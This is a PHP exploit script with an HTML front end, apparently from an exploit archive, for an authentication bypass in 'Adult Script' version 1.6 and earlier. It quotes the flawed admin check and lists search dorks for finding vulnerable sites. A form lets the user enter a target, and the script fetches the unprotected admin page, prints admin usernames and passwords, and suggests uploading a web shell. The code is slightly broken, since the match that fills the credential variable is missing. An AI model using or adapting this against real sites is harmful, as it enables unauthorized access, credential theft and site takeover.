Adult Script <= 1.6 Unauthorized Administrative Access Exploit 
==============================================================



<? ob_implicit_flush(true); ?>
<title>Adult Script Unauthorized Administrative Access Exploit</title>
<style>
body{margin:0px;font-style:normal;font-size:10px;color:#FFFFFF;font-family:Verdana,Arial;background-color:#3a3a3a;scrollbar-face-color: #303030;scrollbar-highlight-color: #5d5d5d;scrollbar-shadow-color: #121212;scrollbar-3dlight-color: #3a3a3a;scrollbar-arrow-color: #9d9d9d;scrollbar-track-color: #3a3a3a;scrollbar-darkshadow-color: #3a3a3a;}
input,
.kbrtm,select{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; height:18; border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;}
button{background-color: #666666; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}
body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}  
textarea{background:#303030;color:#FFFFFF;font-family:Verdana,Arial;font-size:10px;vertical-align:middle; border-left:1px solid #121212; border-right:1px solid #5d5d5d; border-bottom:1px solid #5d5d5d; border-top:1px solid #121212;}
a:link {
	color: #999999;
	text-decoration: none;
        font-weight: bold;
	background-color:#000000;
}
a:visited {
	color: #999999;
	text-decoration: none;
        font-weight: bold;
	background-color:#000000;
}
</style><br>

<h3>Adult Script Unauthorized Administrative Access Exploit</h3><br>
Exploit Coded By Liz0ziM From <a href="http://www.biyofrm.com">BiyoSecurityTeam</a><br>
Greetz My all friend and BiyoSecurityTeam User..
<br>
Software site: http://www.adultscript.net/<br>
Demo: http://www.adultscript.net/demo/<br>

Vulnerable code in <b>admin/administrator.php</b> near lines 5-8</b>

( ($_SESSION[&#039;adminid&#039;]=="") && ($_SESSION[&#039;admintype&#039;] !=1))
{
header("Location: logout.php"); // Bypass Me :D
} 
<br>
<b>Dork</b>:<br>
inurl:submit-user-link.html<br>
inurl:video-listing-cat<br>
inurl:hosted-videos<br>
inurl:porn-listing-cat<br>
"Powered By AdultScript.NET"<br>
"Copyright 2007 [IAG].AdultScript.v1.5.Nulled"<br>
<br>
<form method="POST" action="">
<input name="adres" type="text" value="Target  example: http://www.site.com/" size="70" onFocus="if(this.value==&#039;Target  example: http://www.site.com/&#039;)this.value=&#039;&#039;" onBlur="if(this.value==&#039;&#039;)this.value=&#039;Target  example: http://www.site.com/&#039;">
<input name="yolla" type="submit" value="Send">
</form>

<br>
<?php
function dosya_indir($liz0){
		
		
		$ch = curl_init();
		$timeout = 0;
		curl_setopt ($ch, CURLOPT_URL, $liz0);
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$veri = curl_exec($ch);
		curl_close($ch);
		
		return $veri;

	}

$desen=&#039;|value="(.*)"|&#039;;

if($_POST[yolla])
{
$adres=$_POST[adres];

if(!eregi("http",$adres))
{
$adres="http://".$adres;
}
if($adres=="") { echo &#039;Bos Yerleri Doldurun&#039;; exit(); }
echo &#039;Target= &#039;.htmlspecialchars($adres)."<br>";
sleep(1);
echo &#039;Sending Evil Code.......<br>&#039;;
$kaynak=dosya_indir($adres."/admin/administrator.php");
sleep(5);

if(eregi(&#039;value="&#039;,$kaynak)) { 
echo "Exploit Has Been Succeful <br>";
echo "<a target=&#039;_blank&#039; href=&#039;".$adres."/admin/&#039;>".$adres."/admin/</a><br>";
echo "<b>Username</b> :".htmlspecialchars($sonuc[1][0])."<br>";
echo "<b>Password</b>:".htmlspecialchars($sonuc[1][1])."<br>";
echo $adres."/admin/videolinks_view.php edit video and upload shell :)";
}
else
{
echo "Exploit Has Been Failed! <br>";
}


}
?>



